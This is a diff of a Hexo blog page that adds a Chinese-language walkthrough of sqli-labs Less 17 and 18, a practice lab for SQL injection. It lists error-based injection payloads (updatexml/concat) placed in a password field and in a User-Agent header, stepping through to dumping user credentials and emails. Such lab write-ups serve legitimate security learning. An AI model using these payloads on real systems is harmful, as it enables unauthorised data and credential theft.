@@ -13,6 +13,13 @@
     
 
     
+        <meta name="description" content="Less 17
+1.输入：
+ Username：admin
+ Password：1’
+ 得到：
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version f"/>
+    
 
     <!--Author-->
     
@@ -21,10 +28,17 @@
 
     <!--Open Graph Title-->
     
-        <meta property="og:title" content="Hexo"/>
+        <meta property="og:title" content="sqli-labs 10"/>
     
 
     <!--Open Graph Description-->
+    
+        <meta property="og:description" content="Less 17
+1.输入：
+ Username：admin
+ Password：1’
+ 得到：
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version f"/>
     
 
     <!--Open Graph Site Name-->
@@ -32,7 +46,7 @@
 
     <!--Type page-->
     
-        <meta property="og:type" content="website"/>
+        <meta property="og:type" content="article"/>
     
 
     <!--Page Cover-->
@@ -51,7 +65,7 @@
 
     <!-- Title -->
     
-    <title>page - Hexo</title>
+    <title>sqli-labs 10 - Hexo</title>
 
     <!-- Bootstrap Core CSS -->
     <link href="//maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css" rel="stylesheet"/>
@@ -156,128 +170,90 @@
 
     <!-- Main Content -->
     <!-- Page Header -->
-<!-- Set your background image for this header in the theme's configuration: index_cover -->
+<!-- Set your background image for this header in your post front-matter: cover -->
+
 <header class="intro-header" style="background-image: url('/img/home-bg.jpg')">
     <div class="container">
         <div class="row">
             <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
-                <div class="site-heading">
-                    <h1>Hexo</h1>
-                    <hr class="small">
-                    <span class="subheading"></span>
+                <div class="post-heading">
+                    <h1>sqli-labs 10</h1>
+                    
+                    <span class="meta">
+                        <!-- Date and Author -->
+                        
+                        
+                            2021-08-20
+                        
+                    </span>
                 </div>
             </div>
         </div>
     </div>
 </header>
 
-<!-- Main Content -->
-<div class="container">
-    <div class="row">
-        <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
-            
-                <div class="post-preview">
-    <a href="/2021/07/31/初学sql/">
-        <h2 class="post-title">
-            初学sql
-        </h2>
-        
-    </a>
-    <p class="post-meta">
-        <!-- Date and Author -->
-        
-        2021-07-31
-    </p>
-</div>
-<hr>
-            
-                <div class="post-preview">
-    <a href="/2021/07/23/网安夏令营day5/">
-        <h2 class="post-title">
-            网安夏令营day5
-        </h2>
-        
-    </a>
-    <p class="post-meta">
-        <!-- Date and Author -->
-        
-        2021-07-23
-    </p>
-</div>
-<hr>
-            
-                <div class="post-preview">
-    <a href="/2021/07/22/网安夏令营day4/">
-        <h2 class="post-title">
-            网安夏令营day4
-        </h2>
-        
-    </a>
-    <p class="post-meta">
-        <!-- Date and Author -->
-        
-        2021-07-22
-    </p>
-</div>
-<hr>
-            
-                <div class="post-preview">
-    <a href="/2021/07/21/网安夏令营day3/">
-        <h2 class="post-title">
-            网安夏令营day3
-        </h2>
-        
-    </a>
-    <p class="post-meta">
-        <!-- Date and Author -->
-        
-        2021-07-21
-    </p>
-</div>
-<hr>
-            
-                <div class="post-preview">
-    <a href="/2021/07/20/网安夏令营day2/">
-        <h2 class="post-title">
-            网安夏令营day2
-        </h2>
-        
-    </a>
-    <p class="post-meta">
-        <!-- Date and Author -->
-        
-        2021-07-20
-    </p>
-</div>
-<hr>
-            
-                <div class="post-preview">
-    <a href="/2021/07/19/网安夏令营day1/">
-        <h2 class="post-title">
-            网安夏令营day1
-        </h2>
-        
-    </a>
-    <p class="post-meta">
-        <!-- Date and Author -->
-        
-        2021-07-19
-    </p>
-</div>
-<hr>
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+
+            <!-- Tags and categories -->
+           
+
+            <!-- Gallery -->
             
 
-            <ul class="pager">
-    
-        <li class="previous"><a href="/">&larr;  Newer Posts</a></li>
-    
-    
-</ul>
+            <!-- Post Main Content -->
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <p>Less 17</p>
+<p>1.输入：</p>
+<p> Username：admin</p>
+<p> Password：1’</p>
+<p> 得到：</p>
+<pre><code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;admin&#39;&#39; at line 1
+</code></pre>
+<p>这关以报错注入的方式来解</p>
+<p>2.查询当前数据库名称</p>
+<p>  uname=admin</p>
+<p>  passwd=’or updatexml(1,concat(0x7e,(select database()),0x7e),1)#&amp;submit=Submit</p>
+<p>3.查询数据库名称</p>
+<p>  uname=admin</p>
+<p>  passwd=’or updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 0,1),0x7e),1) #&amp;submit=Submit</p>
+<p>4.查询表的名称</p>
+<p>  uname=admin</p>
+<p>  passwd=’or updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=‘security’ limit 0,1),0x7e),1) #&amp;submit=Submit</p>
+<p>5.查询字段</p>
+<p>  uname=admin</p>
+<p>  passwd=’or updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=‘users’ limit 0,1),0x7e),1) #&amp;submit=Submit</p>
+<p>6.查询账户</p>
+<p>  uname=admin</p>
+<p>  passwd=’or updatexml(1,concat(0x7e,(select group_concat(id,email_id) from security.emails),0x7e),1) #&amp;submit=Submit</p>
+<p>Less 18</p>
+<p> 本关采用 Burp 工具进行代理拦截 , 修改 User-Agent</p>
+<p>1.获取所有数据库</p>
+<p>  User-Agent: ‘ and updatexml(1,concat(‘~’,<br>substr(<br>(select group_concat(schema_name)<br>from information_schema.schemata),50,31)<br>),3) and ‘</p>
+<p>2.获取所有表</p>
+<p>User-Agent: ‘ and updatexml(1,concat(‘~’,<br>substr(<br>(select group_concat(table_name)<br>from information_schema.tables<br>where table_schema=’security’)<br>,1,31)<br>),3) and ‘</p>
+<p>3.获取所有字段</p>
+<p>User-Agent: ‘ and updatexml(1,concat(‘~’,<br>substr(<br>(select group_concat(column_name)<br>from information_schema.columns<br>where table_schema=’security’ and table_name=’users’)<br>,1,31))<br>,3) and ‘</p>
+<p>4.获取账号密码</p>
+<p>User-Agent: ‘ and updatexml(1,concat(‘<del>‘,<br>substr(<br>(select group_concat(username,’</del>‘,password)<br>from security.users)<br>,1,31))<br>,3) and ‘</p>
+
+
+                
+            </div>
+
+            <!-- Comments -->
+            
+                <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                    
+
+
+                </div>
+            
         </div>
     </div>
-</div>
-
-
+</article>
 
     <!-- Footer -->
     <hr />
